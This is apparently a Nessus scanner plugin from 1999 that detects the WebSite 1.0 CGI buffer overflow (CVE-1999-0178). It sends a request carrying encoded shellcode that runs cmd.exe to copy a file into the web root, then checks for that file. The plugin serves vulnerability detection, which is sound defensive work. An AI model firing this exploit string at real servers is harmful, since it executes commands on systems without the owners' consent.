#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10008);
 script_bugtraq_id(2078);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-0178");
 script_name(english:"WebSite 1.0 buffer overflow");
 desc["english"] = "
There is a buffer overflow in some 
WebSite 1.0 CGI scripts which allow a remote intruder 
to execute any command on the remote host.

Platform affected : WindowsNT
		
Solution : Upgrade to the latest version, or contact 
your vendor for a patch.
		
Risk factor : High";

 script_description(english:desc["english"]);

 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 script_summary(english:"WebSite 1.0 CGI arbitrary code execution");
 script_family(english:"Remote file access");
		
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit();
}

##########################
#			 #
# The actual script code # 
#			 #
##########################

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);


command = "/cgi-shl/win-c-sample.exe?+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+h^X%FF%E6%FF%D4%83%C6Lj%01V%8A%06<_u%03%80.?FAI%84%C0u%F0h0%10%F0wYhM\\y[X%050PzPA9%01u%F0%83%E9%10%FF%D1h0%10%F0wYh%D0PvLX%0500vPA9%01u%F0%83%E9%1C%FF%D1cmd.exe_/c_copy_\WebSite\readme.1st_\WebSite\htdocs\x1.htm";

res = is_cgi_installed_ka(item:"x1.htm", port:port);
if(!res)
{
 is_cgi_installed_ka(item:command, port:port);
 res = is_cgi_installed_ka(item:"x1.htm", port:port);
 if(res)security_hole(port);
}


 
 

		  
